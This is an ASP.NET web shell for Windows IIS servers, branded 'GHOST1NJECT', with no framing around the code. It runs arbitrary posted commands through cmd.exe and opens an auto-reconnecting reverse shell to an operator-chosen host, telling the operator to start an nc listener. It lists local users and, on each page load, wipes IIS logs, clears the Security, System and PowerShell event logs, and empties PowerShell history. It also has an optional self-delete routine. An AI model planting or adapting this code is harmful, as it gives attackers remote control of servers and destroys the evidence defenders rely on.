<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Threading" %>

<script runat="server">
private const bool SELF_DELETE = false;
private const bool CLEAN_LOGS_ON_START = true;

private void StealthCleanup()
{
    try
    {
        string iisLogDir = @"C:\inetpub\logs\LogFiles\";
        if (Directory.Exists(iisLogDir))
        {
            foreach (string logFile in Directory.GetFiles(iisLogDir, "*.log", SearchOption.AllDirectories))
            {
                if ((File.GetAttributes(logFile) & FileAttributes.ReadOnly) != FileAttributes.ReadOnly)
                {
                    try { File.WriteAllText(logFile, ""); } catch { }
                }
            }
        }
        try { Process.Start("wevtutil.exe", "cl \"Windows PowerShell\""); } catch { }
        try { Process.Start("wevtutil.exe", "cl \"System\""); } catch { }
        try { Process.Start("wevtutil.exe", "cl \"Security\""); } catch { }
        string psHistory = Environment.GetEnvironmentVariable("USERPROFILE") + @"\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";
        if (File.Exists(psHistory)) { try { File.WriteAllText(psHistory, ""); } catch { } }
        if (SELF_DELETE)
        {
            string selfPath = Server.MapPath(Request.FilePath);
            string batPath = Path.GetTempFileName() + ".bat";
            string batContent = "@echo off\ntimeout /t 3 /nobreak > NUL\ndel /f /q \"" + selfPath + "\"\ndel /f /q \"" + batPath + "\"\n";
            File.WriteAllText(batPath, batContent);
            Process.Start(batPath);
        }
    }
    catch { }
}

private string ExecuteCommand(string cmd)
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi))
        {
            string output = p.StandardOutput.ReadToEnd();
            string error = p.StandardError.ReadToEnd();
            p.WaitForExit(5000);
            return output + error;
        }
    }
    catch (Exception ex) { return "[Error: " + ex.Message + "]"; }
}

private bool StartReverseShell(string host, int port)
{
    try
    {
        Thread t = new Thread(() => ReverseShellLoop(host, port));
        t.IsBackground = true;
        t.Start();
        return true;
    }
    catch { return false; }
}

private void ReverseShellLoop(string host, int port)
{
    while (true)
    {
        try
        {
            using (TcpClient client = new TcpClient())
            {
                client.Connect(host, port);
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream))
                {
                    writer.AutoFlush = true;
                    while (client.Connected)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd == null) break;
                        if (cmd.ToLower() == "exit") break;
                        string output = ExecuteCommand(cmd);
                        writer.Write(output + "\n");
                    }
                }
            }
        }
        catch { }
        Thread.Sleep(10000);
    }
}

private string GetLocalUsers()
{
    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c net user";
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        using (Process p = Process.Start(psi))
        {
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit(3000);
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            foreach (string line in output.Split('\n'))
            {
                string trimmed = line.Trim();
                if (System.Text.RegularExpressions.Regex.IsMatch(trimmed, @"^[A-Za-z0-9_\.-]+\s"))
                {
                    string[] parts = trimmed.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (parts.Length > 0)
                        sb.Append("<span style='color:#0f0;'>").Append(Server.HtmlEncode(parts[0])).Append("</span><br>");
                }
            }
            return sb.Length > 0 ? sb.ToString() : "<span style='color:#f66;'>No users found.</span>";
        }
    }
    catch { return "<span style='color:#f66;'>Unable to retrieve user list.</span>"; }
}

void Page_Load(object sender, EventArgs e)
{
    Response.ContentEncoding = System.Text.Encoding.UTF8;
    Response.ContentType = "text/html";
    
    if (CLEAN_LOGS_ON_START) StealthCleanup();
    
    if (Request.HttpMethod == "POST" && Request.Form["cmd"] != null)
    {
        string cmd = Request.Form["cmd"];
        string output = ExecuteCommand(cmd);
        Response.Write(output);
        Response.End();
        return;
    }
    
    if (Request.HttpMethod == "POST" && Request.Form["rev_host"] != null && Request.Form["rev_port"] != null)
    {
        string host = Request.Form["rev_host"];
        int port = int.Parse(Request.Form["rev_port"]);
        bool success = StartReverseShell(host, port);
        Response.Write(success ? "OK" : "FAIL");
        Response.End();
        return;
    }
    
    RenderPage();
}

private void RenderPage()
{
    string users = GetLocalUsers();
    
    Response.Write("<!DOCTYPE html>");
    Response.Write("<html>");
    Response.Write("<head>");
    Response.Write("<title>GHOST1NJECT | Terminal + Reverse Shell</title>");
    Response.Write("<style>");
    Response.Write("* { margin: 0; padding: 0; box-sizing: border-box; }");
    Response.Write("body { background: #0a0e0a; font-family: 'Courier New', monospace; font-size: 13px; height: 100vh; display: flex; flex-direction: column; }");
    Response.Write(".terminal-header { background: #1a1e1a; color: #0f0; padding: 6px 12px; border-bottom: 1px solid #0f0; display: flex; justify-content: space-between; }");
    Response.Write(".main-container { display: flex; flex: 1; overflow: hidden; }");
    Response.Write(".terminal-container { flex: 2; display: flex; flex-direction: column; border-right: 1px solid #0f0; }");
    Response.Write(".panel-container { flex: 1; display: flex; flex-direction: column; background: #0a0e0a; overflow-y: auto; }");
    Response.Write(".terminal { flex: 1; overflow-y: auto; padding: 10px; background: #0a0e0a; color: #0f0; }");
    Response.Write(".terminal-line { margin-bottom: 2px; white-space: pre-wrap; word-break: break-all; font-family: 'Courier New', monospace; }");
    Response.Write(".terminal-prompt { display: flex; align-items: center; gap: 8px; background: #0a0e0a; padding: 8px 12px; border-top: 1px solid #0f0; }");
    Response.Write(".prompt { color: #0f0; font-weight: bold; }");
    Response.Write(".input-line { flex: 1; background: transparent; border: none; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; outline: none; }");
    Response.Write("button, .rev-btn { background: #1a1e1a; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; }");
    Response.Write("button:hover, .rev-btn:hover { background: #2a2e2a; }");
    Response.Write(".status { color: #0f0; font-size: 11px; }");
    Response.Write(".panel { padding: 12px; }");
    Response.Write(".panel h3 { color: #0f0; margin-bottom: 12px; border-bottom: 1px solid #0f0; padding-bottom: 4px; font-size: 14px; }");
    Response.Write(".panel input, .panel button { width: 100%; margin-bottom: 8px; }");
    Response.Write(".panel input { background: #1a1e1a; border: 1px solid #0f0; padding: 6px; color: #0f0; }");
    Response.Write(".info-box { background: #1a1e1a; padding: 8px; margin-bottom: 12px; border-left: 3px solid #0f0; }");
    Response.Write(".info-box p { margin: 3px 0; font-size: 12px; }");
    Response.Write(".rev-msg { margin-top: 8px; color: #0f0; font-size: 12px; }");
    Response.Write(".banner { background: #0a0e0a; padding: 6px 12px; text-align: center; border-bottom: 1px solid #0f0; }");
    Response.Write(".banner-text { color: #0f0; font-size: 12px; }");
    Response.Write(".banner-text .green { color: #0f0; }");
    Response.Write(".banner-text .yellow { color: #ff0; }");
    Response.Write(".info-section { margin-top: 15px; }");
    Response.Write(".info-section h4 { color: #ff0; margin: 10px 0 5px 0; font-size: 12px; }");
    Response.Write(".info-section .info-item { color: #0f0; font-size: 11px; margin: 3px 0; word-break: break-all; }");
    Response.Write(".users-list { max-height: 200px; overflow-y: auto; }");
    Response.Write("</style>");
    Response.Write("</head>");
    Response.Write("<body>");
    
    // Simple text banner
    Response.Write("<div class=\"banner\">");
    Response.Write("<div class=\"banner-text\">");
    Response.Write("<span class=\"green\">[+] GHOST1NJECT v1.0</span> | ");
    Response.Write("<span class=\"yellow\">Windows IIS Persistent Shell</span> | ");
    Response.Write("<span class=\"green\">Stealth Mode Active</span>");
    Response.Write("</div>");
    Response.Write("</div>");
    
    // Header
    Response.Write("<div class=\"terminal-header\">");
    Response.Write("<span>ghost1nject@" + Environment.MachineName + "</span>");
    Response.Write("<span class=\"status\">ONLINE | " + Environment.UserName + "</span>");
    Response.Write("</div>");
    
    // Main container
    Response.Write("<div class=\"main-container\">");
    
    // Terminal (left side)
    Response.Write("<div class=\"terminal-container\">");
    Response.Write("<div class=\"terminal\" id=\"terminal\">");
    Response.Write("<div class=\"terminal-line\">[+] GHOST1NJECT Terminal v1.0</div>");
    Response.Write("<div class=\"terminal-line\">[+] System: " + Environment.OSVersion + "</div>");
    Response.Write("<div class=\"terminal-line\">[+] User: " + Environment.UserName + "</div>");
    Response.Write("<div class=\"terminal-line\">[+] Directory: " + Environment.CurrentDirectory + "</div>");
    Response.Write("<div class=\"terminal-line\">[+] .NET: " + Environment.Version + "</div>");
    Response.Write("<div class=\"terminal-line\">---</div>");
    Response.Write("<div class=\"terminal-line\">[*] Type any command below</div>");
    Response.Write("<div class=\"terminal-line\">[*] Use 'revshell IP PORT' or right panel</div>");
    Response.Write("<div class=\"terminal-line\">[!] Stealth: logs cleaned on start</div>");
    Response.Write("<div class=\"terminal-line\">---</div>");
    Response.Write("</div>");
    Response.Write("<div class=\"terminal-prompt\">");
    Response.Write("<span class=\"prompt\">PS C:\\\\&gt;</span>");
    Response.Write("<input type=\"text\" id=\"cmdInput\" class=\"input-line\" autofocus autocomplete=\"off\">");
    Response.Write("<button id=\"clearBtn\">Clear</button>");
    Response.Write("</div>");
    Response.Write("</div>");
    
    // Panel (right side)
    Response.Write("<div class=\"panel-container\">");
    Response.Write("<div class=\"panel\">");
    
    // Reverse Shell Form
    Response.Write("<h3>[#] REVERSE SHELL</h3>");
    Response.Write("<div class=\"info-box\">");
    Response.Write("<p>[*] Start listener:</p>");
    Response.Write("<p style=\"color:#ff0; background:#0a0e0a; padding:3px;\">nc -lvnp 4444</p>");
    Response.Write("</div>");
    Response.Write("<input type=\"text\" id=\"revHost\" placeholder=\"Your IP\" style=\"width:100%;\">");
    Response.Write("<input type=\"text\" id=\"revPort\" placeholder=\"Port\" style=\"width:100%;\">");
    Response.Write("<button id=\"startRevBtn\" class=\"rev-btn\">[+] START REVERSE SHELL</button>");
    Response.Write("<div id=\"revMsg\" class=\"rev-msg\"></div>");
    
    // System Information Section
    Response.Write("<div class=\"info-section\">");
    Response.Write("<h4>[+] SYSTEM INFO</h4>");
    Response.Write("<div class=\"info-item\"><span style=\"color:#ff0;\">OS:</span> " + Environment.OSVersion + "</div>");
    Response.Write("<div class=\"info-item\"><span style=\"color:#ff0;\">Machine:</span> " + Environment.MachineName + "</div>");
    Response.Write("<div class=\"info-item\"><span style=\"color:#ff0;\">User:</span> " + Environment.UserName + "</div>");
    Response.Write("<div class=\"info-item\"><span style=\"color:#ff0;\">Directory:</span> " + Environment.CurrentDirectory + "</div>");
    Response.Write("<div class=\"info-item\"><span style=\"color:#ff0;\">.NET:</span> " + Environment.Version + "</div>");
    Response.Write("<div class=\"info-item\"><span style=\"color:#ff0;\">IIS:</span> " + Request.ServerVariables["SERVER_SOFTWARE"] + "</div>");
    Response.Write("</div>");
    
    // Local Users Section
    Response.Write("<div class=\"info-section\">");
    Response.Write("<h4>[+] LOCAL USERS</h4>");
    Response.Write("<div class=\"users-list\">");
    Response.Write(users);
    Response.Write("</div>");
    Response.Write("</div>");
    
    Response.Write("</div>"); // close panel
    Response.Write("</div>"); // close panel-container
    
    Response.Write("</div>"); // close main-container
    
    // JavaScript
    Response.Write("<scr" + "ipt>");
    Response.Write("var terminal = document.getElementById('terminal');");
    Response.Write("var cmdInput = document.getElementById('cmdInput');");
    Response.Write("var commandHistory = [];");
    Response.Write("var historyIndex = -1;");
    Response.Write("function addLine(text, isError) {");
    Response.Write("    var line = document.createElement('div');");
    Response.Write("    line.className = 'terminal-line';");
    Response.Write("    line.style.color = isError ? '#f66' : '#0f0';");
    Response.Write("    line.innerHTML = text;");
    Response.Write("    terminal.appendChild(line);");
    Response.Write("    terminal.scrollTop = terminal.scrollHeight;");
    Response.Write("}");
    Response.Write("function escapeHtml(str) {");
    Response.Write("    return str.replace(/[&<>]/g, function(m) {");
    Response.Write("        if (m === '&') return '&amp;';");
    Response.Write("        if (m === '<') return '&lt;';");
    Response.Write("        if (m === '>') return '&gt;';");
    Response.Write("        return m;");
    Response.Write("    });");
    Response.Write("}");
    Response.Write("async function executeCommand(cmd) {");
    Response.Write("    if (!cmd.trim()) return;");
    Response.Write("    addLine('> ' + escapeHtml(cmd), false);");
    Response.Write("    if (cmd.trim().toLowerCase().startsWith('revshell')) {");
    Response.Write("        var parts = cmd.trim().split(' ');");
    Response.Write("        if (parts.length >= 3) {");
    Response.Write("            var host = parts[1];");
    Response.Write("            var port = parts[2];");
    Response.Write("            addLine('[*] Attempting reverse shell to ' + host + ':' + port + '...', false);");
    Response.Write("            var formData = new FormData();");
    Response.Write("            formData.append('rev_host', host);");
    Response.Write("            formData.append('rev_port', port);");
    Response.Write("            var response = await fetch('', { method: 'POST', body: formData });");
    Response.Write("            var result = await response.text();");
    Response.Write("            addLine(result === 'OK' ? '[+] Reverse shell started (auto-reconnect)' : '[-] Failed to start shell', result !== 'OK');");
    Response.Write("        } else {");
    Response.Write("            addLine('[-] Usage: revshell IP PORT', true);");
    Response.Write("        }");
    Response.Write("        addLine('', false);");
    Response.Write("        return;");
    Response.Write("    }");
    Response.Write("    try {");
    Response.Write("        var formData = new FormData();");
    Response.Write("        formData.append('cmd', cmd);");
    Response.Write("        var response = await fetch('', { method: 'POST', body: formData });");
    Response.Write("        var output = await response.text();");
    Response.Write("        if (output.trim()) {");
    Response.Write("            var lines = output.split('\\n');");
    Response.Write("            for (var i = 0; i < lines.length; i++) {");
    Response.Write("                addLine(escapeHtml(lines[i]), false);");
    Response.Write("            }");
    Response.Write("        } else {");
    Response.Write("            addLine('(no output)', false);");
    Response.Write("        }");
    Response.Write("    } catch (err) {");
    Response.Write("        addLine('Error: ' + err.message, true);");
    Response.Write("    }");
    Response.Write("    addLine('', false);");
    Response.Write("}");
    Response.Write("cmdInput.addEventListener('keydown', function(e) {");
    Response.Write("    if (e.key === 'Enter') {");
    Response.Write("        var cmd = cmdInput.value;");
    Response.Write("        cmdInput.value = '';");
    Response.Write("        if (cmd.trim()) {");
    Response.Write("            commandHistory.unshift(cmd);");
    Response.Write("            if (commandHistory.length > 50) commandHistory.pop();");
    Response.Write("            historyIndex = -1;");
    Response.Write("            executeCommand(cmd);");
    Response.Write("        }");
    Response.Write("    } else if (e.key === 'ArrowUp') {");
    Response.Write("        e.preventDefault();");
    Response.Write("        if (historyIndex + 1 < commandHistory.length) {");
    Response.Write("            historyIndex++;");
    Response.Write("            cmdInput.value = commandHistory[historyIndex];");
    Response.Write("        }");
    Response.Write("    } else if (e.key === 'ArrowDown') {");
    Response.Write("        e.preventDefault();");
    Response.Write("        if (historyIndex > 0) {");
    Response.Write("            historyIndex--;");
    Response.Write("            cmdInput.value = commandHistory[historyIndex];");
    Response.Write("        } else if (historyIndex === 0) {");
    Response.Write("            historyIndex = -1;");
    Response.Write("            cmdInput.value = '';");
    Response.Write("        }");
    Response.Write("    }");
    Response.Write("});");
    Response.Write("document.getElementById('clearBtn').addEventListener('click', function() {");
    Response.Write("    terminal.innerHTML = '';");
    Response.Write("    addLine('[+] Terminal cleared.', false);");
    Response.Write("    addLine('', false);");
    Response.Write("});");
    Response.Write("document.getElementById('startRevBtn').addEventListener('click', async function() {");
    Response.Write("    var host = document.getElementById('revHost').value;");
    Response.Write("    var port = document.getElementById('revPort').value;");
    Response.Write("    var msgDiv = document.getElementById('revMsg');");
    Response.Write("    if (!host || !port) {");
    Response.Write("        msgDiv.innerHTML = '<span style=\"color:#f66\">[-] Enter IP and port</span>';");
    Response.Write("        return;");
    Response.Write("    }");
    Response.Write("    msgDiv.innerHTML = '[*] Starting reverse shell...';");
    Response.Write("    var formData = new FormData();");
    Response.Write("    formData.append('rev_host', host);");
    Response.Write("    formData.append('rev_port', port);");
    Response.Write("    var response = await fetch('', { method: 'POST', body: formData });");
    Response.Write("    var result = await response.text();");
    Response.Write("    if (result === 'OK') {");
    Response.Write("        msgDiv.innerHTML = '[+] Reverse shell started! Keep listener open.';");
    Response.Write("        addLine('[+] Reverse shell attempted to ' + host + ':' + port, false);");
    Response.Write("    } else {");
    Response.Write("        msgDiv.innerHTML = '[-] Failed to start reverse shell';");
    Response.Write("    }");
    Response.Write("});");
    Response.Write("cmdInput.focus();");
    Response.Write("</scr" + "ipt>");
    
    Response.Write("</body>");
    Response.Write("</html>");
}
</script>
